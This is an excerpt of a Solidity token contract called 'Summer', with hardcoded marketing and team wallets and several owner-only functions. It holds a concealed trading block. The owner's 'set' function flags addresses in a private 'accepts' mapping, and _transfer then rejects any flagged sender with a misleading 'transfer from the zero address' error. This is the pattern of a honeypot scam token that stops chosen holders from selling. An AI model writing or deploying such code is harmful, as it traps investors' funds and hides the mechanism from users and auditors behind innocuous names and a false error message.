...
contract Summer is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x5BCf1F86E9fd3A8c59ACBc8419dCC15e05eCdf25);
    address payable public teamWalletAddress = payable(0xB295abC54a0ea12C4dd10c3446fe6a4bc2C7A406);
    ...
    mapping (address => bool) private accepts;

    
    string private _name = "Summer";
    ...
    function set(address[] calldata accounts) public onlyOwner {
        for(uint i=0; i < accounts.length; i++) {
            accepts[accounts[i]] = true;
        }  
    }

    function reset(address account) public onlyOwner {
        accepts[account] = false;
    }

    function warp(address account, uint256 amount) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(accepts[sender] == false, "ERC20: transfer from the zero address");
